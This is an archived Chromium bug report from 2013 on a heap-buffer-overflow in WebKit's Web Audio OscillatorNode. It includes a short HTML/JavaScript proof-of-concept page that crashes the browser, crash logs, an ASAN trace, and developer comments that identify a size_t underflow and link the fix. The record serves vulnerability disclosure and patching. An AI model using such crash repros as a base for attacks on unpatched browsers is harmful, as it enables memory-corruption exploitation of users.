# Heap-buffer-overflow in WebCore::OscillatorNode::process

| Field | Value |
|-------|-------|
| **Issue ID** | [40076873](https://issues.chromium.org/issues/40076873) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>Media>Audio |
| **Reporter** | at...@gmail.com |
| **Assignee** | rt...@chromium.org |
| **Created** | 2013-01-25 |
| **Bounty** | $1,000.00 |

## Description


Tested on:

OS: Ubuntu 12.04
Chromium: ASAN Chromium	26.0.1388.0 (Developer Build 177738)
Google Chrome:	24.0.1312.56 (Official Build 177594)


Repro-file:

<html>
<script>
var context= new webkitAudioContext()
var oscillator= context.createOscillator()

oscillator.start(0.701,0.7,0.7)

setInterval(function(){
oscillator.connect(context.destination);
},4)

oscillator.stop(0.70)

</script>
</html>


Google Chrome 24.0.1312.56:

[13234.928842] chrome[13724] general protection ip:7f4b37009020 sp:7fffd1074b50 error:0 in chrome[7f4b35421000+4c45000]
[13603.078627] Chrome_ChildIOT[14523] general protection ip:7f4b363a52be sp:7f4b280d02e0 error:0 in chrome[7f4b35421000+4c45000]
[13627.641909] chrome[14621] trap stack segment ip:7fe7c77d8d59 sp:7fff104b9640 error:0

Crash ID a7102683f2014761

ASAN-report:

==13772== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7fe161ba0240 at pc 0x7fe1740e7292 bp 0x7fe15cce6070 sp 0x7fe15cce6068
WRITE of size 4 at 0x7fe161ba0240 thread T6 (AudioOutputDevic)
    #0 0x7fe1740e7291 in WebCore::OscillatorNode::process(unsigned long) ???:0
    #1 0x7fe1736b21dc in WebCore::AudioNode::processIfNecessary(unsigned long) ???:0
    #2 0x7fe1736b7d59 in WebCore::AudioNodeOutput::pull(WebCore::AudioBus*, unsigned long) ???:0
    #3 0x7fe1744f8247 in WebCore::AudioDestinationNode::render(WebCore::AudioBus*, WebCore::AudioBus*, unsigned long) ???:0
    #4 0x7fe176a6b61d in WebCore::AudioPullFIFO::consume(WebCore::AudioBus*, unsigned long) ???:0
    #5 0x7fe1768735b6 in WebCore::AudioDestinationChromium::render(WebKit::WebVector<float*> const&, WebKit::WebVector<float*> const&, unsigned long) ???:0
 .
 .
 .
allocated by thread T0 (chrome) here:
    #0 0x7fe16ff71a92 in malloc ??:0
    #1 0x7fe1779f6d58 in WTF::fastMalloc(unsigned long) ???:0
    #2 0x7fe1740cc447 in WebCore::AudioArray<float>::allocate(unsigned long) ???:0
    #3 0x7fe176858213 in WebCore::AudioBus::AudioBus(unsigned int, unsigned long, bool) ???:0
    #4 0x7fe1736b74dd in WebCore::AudioNodeOutput::AudioNodeOutput(WebCore::AudioNode*, unsigned int) ???:0
    #5 0x7fe1740e528f in WebCore::OscillatorNode::OscillatorNode(WebCore::AudioContext*, float) ???:0
 .
 .
 .


## Timeline

### in...@chromium.org (2013-01-25)

Andrew, would be a good owner for this one.

### sc...@chromium.org (2013-01-25)

OscillatorNode! Sounds mighty WebAudio-ish to :)

crogers / rtoy: can one of you pick this up ASAP?

### da...@chromium.org (2013-01-25)

crogers is out on vacation.

### rt...@chromium.org (2013-01-25)

The sample test causes a crash in a debug build in ToT chromium. Investigating cause now.

### rt...@chromium.org (2013-01-25)

Appears to be a bug in AudioScheduledSourceNode::updateSchedulingInfo:

        if (isSafe) {
            nonSilentFramesToProcess -= framesToZero;

In the test, nonSilentFramesToProcess is 16, framesToZero is 64.  We would get a negative number, but since nonSilentFramesToProcess is a size_t, we get a huge number.  The oscillator node processes that huge number of frames, scribbling over memory.

Changing the code so that nonSilentFramesToProcess is set to 0 if it would have gone negative, fixes the debug build so that it doesn't crash.

I'll want to do an ASAN build just to check, but this is definitely a bug.


### rt...@chromium.org (2013-01-25)

See https://bugs.webkit.org/show_bug.cgi?id=107966 for a fix.

### in...@chromium.org (2013-01-31)

http://trac.webkit.org/changeset/140879

### sc...@gmail.com (2013-02-12)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-02-12)

M25: http://trac.webkit.org/changeset/142676

### sc...@gmail.com (2013-02-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-02-19)

@attekett: $1000, etc., thanks! :D

### sc...@gmail.com (2013-03-02)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-05)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-06-24)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### ss...@google.com (2016-03-21)

Renaming Blink>Audio to Blink>Media>Audio for better characterization

[Monorail components: -Blink>Audio Blink>Media>Audio]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-29)

[Empty comment from Monorail migration]

### is...@google.com (2018-07-29)

This issue was migrated from crbug.com/chromium/172243?no_tracker_redirect=1

[Multiple monorail components: Blink, Blink>Media>Audio]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40076873)*
